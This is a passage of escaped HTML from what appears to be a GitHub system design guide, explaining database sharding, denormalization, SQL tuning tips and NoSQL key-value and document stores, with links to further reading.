&lt;h4&gt;&lt;a id="user-content-sharding" class="anchor" aria-hidden="true" href="#sharding"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Sharding&lt;/h4&gt;
&lt;p align="center"&gt;
  &lt;a target="_blank" rel="noopener noreferrer" href="https://camo.githubusercontent.com/1df78be67b749171569a0e11a51aa76b3b678d4f/687474703a2f2f692e696d6775722e636f6d2f775538783549642e706e67"&gt;&lt;img src="https://camo.githubusercontent.com/1df78be67b749171569a0e11a51aa76b3b678d4f/687474703a2f2f692e696d6775722e636f6d2f775538783549642e706e67" data-canonical-src="http://i.imgur.com/wU8x5Id.png" style="max-width:100%;"&gt;&lt;/a&gt;
  &lt;br&gt;
  &lt;i&gt;&lt;a href="http://www.slideshare.net/jboner/scalability-availability-stability-patterns/" rel="nofollow"&gt;Source: Scalability, availability, stability, patterns&lt;/a&gt;&lt;/i&gt;
&lt;/p&gt;
&lt;p&gt;Sharding distributes data across different databases such that each database can only manage a subset of the data.  Taking a users database as an example, as the number of users increases, more shards are added to the cluster.&lt;/p&gt;
&lt;p&gt;Similar to the advantages of &lt;a href="#federation"&gt;federation&lt;/a&gt;, sharding results in less read and write traffic, less replication, and more cache hits.  Index size is also reduced, which generally improves performance with faster queries.  If one shard goes down, the other shards are still operational, although you'll want to add some form of replication to avoid data loss.  Like federation, there is no single central master serializing writes, allowing you to write in parallel with increased throughput.&lt;/p&gt;
&lt;p&gt;Common ways to shard a table of users is either through the user's last name initial or the user's geographic location.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-sharding" class="anchor" aria-hidden="true" href="#disadvantages-sharding"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): sharding&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;You'll need to update your application logic to work with shards, which could result in complex SQL queries.&lt;/li&gt;
&lt;li&gt;Data distribution can become lopsided in a shard.  For example, a set of power users on a shard could result in increased load to that shard compared to others.
&lt;ul&gt;
&lt;li&gt;Rebalancing adds additional complexity.  A sharding function based on &lt;a href="http://www.paperplanes.de/2011/12/9/the-magic-of-consistent-hashing.html" rel="nofollow"&gt;consistent hashing&lt;/a&gt; can reduce the amount of transferred data.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Joining data from multiple shards is more complex.&lt;/li&gt;
&lt;li&gt;Sharding adds more hardware and additional complexity.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-sharding" class="anchor" aria-hidden="true" href="#sources-and-further-reading-sharding"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: sharding&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://highscalability.com/blog/2009/8/6/an-unorthodox-approach-to-database-design-the-coming-of-the.html" rel="nofollow"&gt;The coming of the shard&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Shard_(database_architecture)" rel="nofollow"&gt;Shard database architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.paperplanes.de/2011/12/9/the-magic-of-consistent-hashing.html" rel="nofollow"&gt;Consistent hashing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-denormalization" class="anchor" aria-hidden="true" href="#denormalization"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Denormalization&lt;/h4&gt;
&lt;p&gt;Denormalization attempts to improve read performance at the expense of some write performance.  Redundant copies of the data are written in multiple tables to avoid expensive joins.  Some RDBMS such as &lt;a href="https://en.wikipedia.org/wiki/PostgreSQL" rel="nofollow"&gt;PostgreSQL&lt;/a&gt; and Oracle support &lt;a href="https://en.wikipedia.org/wiki/Materialized_view" rel="nofollow"&gt;materialized views&lt;/a&gt; which handle the work of storing redundant information and keeping redundant copies consistent.&lt;/p&gt;
&lt;p&gt;Once data becomes distributed with techniques such as &lt;a href="#federation"&gt;federation&lt;/a&gt; and &lt;a href="#sharding"&gt;sharding&lt;/a&gt;, managing joins across data centers further increases complexity.  Denormalization might circumvent the need for such complex joins.&lt;/p&gt;
&lt;p&gt;In most systems, reads can heavily outnumber writes 100:1 or even 1000:1.  A read resulting in a complex database join can be very expensive, spending a significant amount of time on disk operations.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-disadvantages-denormalization" class="anchor" aria-hidden="true" href="#disadvantages-denormalization"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Disadvantage(s): denormalization&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Data is duplicated.&lt;/li&gt;
&lt;li&gt;Constraints can help redundant copies of information stay in sync, which increases complexity of the database design.&lt;/li&gt;
&lt;li&gt;A denormalized database under heavy write load might perform worse than its normalized counterpart.&lt;/li&gt;
&lt;/ul&gt;
&lt;h6&gt;&lt;a id="user-content-sources-and-further-reading-denormalization" class="anchor" aria-hidden="true" href="#sources-and-further-reading-denormalization"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: denormalization&lt;/h6&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Denormalization" rel="nofollow"&gt;Denormalization&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-sql-tuning" class="anchor" aria-hidden="true" href="#sql-tuning"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;SQL tuning&lt;/h4&gt;
&lt;p&gt;SQL tuning is a broad topic and many &lt;a href="https://www.amazon.com/s/ref=nb_sb_noss_2?url=search-alias%3Daps&amp;amp;field-keywords=sql+tuning" rel="nofollow"&gt;books&lt;/a&gt; have been written as reference.&lt;/p&gt;
&lt;p&gt;It's important to &lt;strong&gt;benchmark&lt;/strong&gt; and &lt;strong&gt;profile&lt;/strong&gt; to simulate and uncover bottlenecks.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Benchmark&lt;/strong&gt; - Simulate high-load situations with tools such as &lt;a href="http://httpd.apache.org/docs/2.2/programs/ab.html" rel="nofollow"&gt;ab&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Profile&lt;/strong&gt; - Enable tools such as the &lt;a href="http://dev.mysql.com/doc/refman/5.7/en/slow-query-log.html" rel="nofollow"&gt;slow query log&lt;/a&gt; to help track performance issues.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Benchmarking and profiling might point you to the following optimizations.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-tighten-up-the-schema" class="anchor" aria-hidden="true" href="#tighten-up-the-schema"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tighten up the schema&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;MySQL dumps to disk in contiguous blocks for fast access.&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;CHAR&lt;/code&gt; instead of &lt;code&gt;VARCHAR&lt;/code&gt; for fixed-length fields.
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;CHAR&lt;/code&gt; effectively allows for fast, random access, whereas with &lt;code&gt;VARCHAR&lt;/code&gt;, you must find the end of a string before moving onto the next one.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;TEXT&lt;/code&gt; for large blocks of text such as blog posts.  &lt;code&gt;TEXT&lt;/code&gt; also allows for boolean searches.  Using a &lt;code&gt;TEXT&lt;/code&gt; field results in storing a pointer on disk that is used to locate the text block.&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;INT&lt;/code&gt; for larger numbers up to 2^32 or 4 billion.&lt;/li&gt;
&lt;li&gt;Use &lt;code&gt;DECIMAL&lt;/code&gt; for currency to avoid floating point representation errors.&lt;/li&gt;
&lt;li&gt;Avoid storing large &lt;code&gt;BLOBS&lt;/code&gt;, store the location of where to get the object instead.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;VARCHAR(255)&lt;/code&gt; is the largest number of characters that can be counted in an 8 bit number, often maximizing the use of a byte in some RDBMS.&lt;/li&gt;
&lt;li&gt;Set the &lt;code&gt;NOT NULL&lt;/code&gt; constraint where applicable to &lt;a href="http://stackoverflow.com/questions/1017239/how-do-null-values-affect-performance-in-a-database-search" rel="nofollow"&gt;improve search performance&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-use-good-indices" class="anchor" aria-hidden="true" href="#use-good-indices"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Use good indices&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Columns that you are querying (&lt;code&gt;SELECT&lt;/code&gt;, &lt;code&gt;GROUP BY&lt;/code&gt;, &lt;code&gt;ORDER BY&lt;/code&gt;, &lt;code&gt;JOIN&lt;/code&gt;) could be faster with indices.&lt;/li&gt;
&lt;li&gt;Indices are usually represented as self-balancing &lt;a href="https://en.wikipedia.org/wiki/B-tree" rel="nofollow"&gt;B-tree&lt;/a&gt; that keeps data sorted and allows searches, sequential access, insertions, and deletions in logarithmic time.&lt;/li&gt;
&lt;li&gt;Placing an index can keep the data in memory, requiring more space.&lt;/li&gt;
&lt;li&gt;Writes could also be slower since the index also needs to be updated.&lt;/li&gt;
&lt;li&gt;When loading large amounts of data, it might be faster to disable indices, load the data, then rebuild the indices.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-avoid-expensive-joins" class="anchor" aria-hidden="true" href="#avoid-expensive-joins"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Avoid expensive joins&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#denormalization"&gt;Denormalize&lt;/a&gt; where performance demands it.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-partition-tables" class="anchor" aria-hidden="true" href="#partition-tables"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Partition tables&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;Break up a table by putting hot spots in a separate table to help keep it in memory.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-tune-the-query-cache" class="anchor" aria-hidden="true" href="#tune-the-query-cache"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Tune the query cache&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;In some cases, the &lt;a href="https://dev.mysql.com/doc/refman/5.7/en/query-cache.html" rel="nofollow"&gt;query cache&lt;/a&gt; could lead to &lt;a href="https://www.percona.com/blog/2016/10/12/mysql-5-7-performance-tuning-immediately-after-installation/" rel="nofollow"&gt;performance issues&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-sql-tuning" class="anchor" aria-hidden="true" href="#sources-and-further-reading-sql-tuning"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: SQL tuning&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://aiddroid.com/10-tips-optimizing-mysql-queries-dont-suck/" rel="nofollow"&gt;Tips for optimizing MySQL queries&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/1217466/is-there-a-good-reason-i-see-varchar255-used-so-often-as-opposed-to-another-l" rel="nofollow"&gt;Is there a good reason i see VARCHAR(255) used so often?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/1017239/how-do-null-values-affect-performance-in-a-database-search" rel="nofollow"&gt;How do null values affect performance?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://dev.mysql.com/doc/refman/5.7/en/slow-query-log.html" rel="nofollow"&gt;Slow query log&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-nosql" class="anchor" aria-hidden="true" href="#nosql"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;NoSQL&lt;/h3&gt;
&lt;p&gt;NoSQL is a collection of data items represented in a &lt;strong&gt;key-value store&lt;/strong&gt;, &lt;strong&gt;document store&lt;/strong&gt;, &lt;strong&gt;wide column store&lt;/strong&gt;, or a &lt;strong&gt;graph database&lt;/strong&gt;.  Data is denormalized, and joins are generally done in the application code.  Most NoSQL stores lack true ACID transactions and favor &lt;a href="#eventual-consistency"&gt;eventual consistency&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;BASE&lt;/strong&gt; is often used to describe the properties of NoSQL databases.  In comparison with the &lt;a href="#cap-theorem"&gt;CAP Theorem&lt;/a&gt;, BASE chooses availability over consistency.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Basically available&lt;/strong&gt; - the system guarantees availability.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Soft state&lt;/strong&gt; - the state of the system may change over time, even without input.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Eventual consistency&lt;/strong&gt; - the system will become consistent over a period of time, given that the system doesn't receive input during that period.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In addition to choosing between &lt;a href="#sql-or-nosql"&gt;SQL or NoSQL&lt;/a&gt;, it is helpful to understand which type of NoSQL database best fits your use case(s).  We'll review &lt;strong&gt;key-value stores&lt;/strong&gt;, &lt;strong&gt;document stores&lt;/strong&gt;, &lt;strong&gt;wide column stores&lt;/strong&gt;, and &lt;strong&gt;graph databases&lt;/strong&gt; in the next section.&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-key-value-store" class="anchor" aria-hidden="true" href="#key-value-store"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Key-value store&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Abstraction: hash table&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A key-value store generally allows for O(1) reads and writes and is often backed by memory or SSD.  Data stores can maintain keys in &lt;a href="https://en.wikipedia.org/wiki/Lexicographical_order" rel="nofollow"&gt;lexicographic order&lt;/a&gt;, allowing efficient retrieval of key ranges.  Key-value stores can allow for storing of metadata with a value.&lt;/p&gt;
&lt;p&gt;Key-value stores provide high performance and are often used for simple data models or for rapidly-changing data, such as an in-memory cache layer.  Since they offer only a limited set of operations, complexity is shifted to the application layer if additional operations are needed.&lt;/p&gt;
&lt;p&gt;A key-value store is the basis for more complex systems such as a document store, and in some cases, a graph database.&lt;/p&gt;
&lt;h5&gt;&lt;a id="user-content-sources-and-further-reading-key-value-store" class="anchor" aria-hidden="true" href="#sources-and-further-reading-key-value-store"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Source(s) and further reading: key-value store&lt;/h5&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://en.wikipedia.org/wiki/Key-value_database" rel="nofollow"&gt;Key-value database&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://stackoverflow.com/questions/4056093/what-are-the-disadvantages-of-using-a-key-value-table-over-nullable-columns-or" rel="nofollow"&gt;Disadvantages of key-value stores&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://qnimate.com/overview-of-redis-architecture/" rel="nofollow"&gt;Redis architecture&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.adayinthelifeof.nl/2011/02/06/memcache-internals/" rel="nofollow"&gt;Memcached architecture&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;&lt;a id="user-content-document-store" class="anchor" aria-hidden="true" href="#document-store"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Document store&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Abstraction: key-value store with documents stored as values&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;A document store is centered around documents (XML, JSON, binary, etc), where a document stores all information for a given object.  Document stores provide APIs or a query language to query based on the internal structure of the document itself.  &lt;em&gt;Note, many key-value stores include features for working with a value's metadata, blurring the lines between these two storage types.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Based on the underlying implementation, documents are organized by collections, tags, metadata, or directories.  Although documents can be organized or grouped together, documents may have fields that are completely different from each other.&lt;/p&gt;
&lt;p&gt;Some document stores like &lt;a href="https://www.mongodb.com/mongodb-architecture" rel="nofollow"&gt;MongoDB&lt;/a&gt; and &lt;a href="https://blog.couchdb.org/2016/08/01/couchdb-2-0-architecture/" rel="nofollow"&gt;CouchDB&lt;/a&gt; also provide a SQL-like language to perform complex queries.  &lt;a href="http://www.read.seas.harvard.edu/~kohler/class/cs239-w08/decandia07dynamo.pdf" rel="nofollow"&gt;DynamoDB&lt;/a&gt; supports both key-values and documents.&lt;/p&gt;
&lt;p&gt;Document stores provide high flexibility and are often used for working with occasionally changing data.&lt;/p&gt;
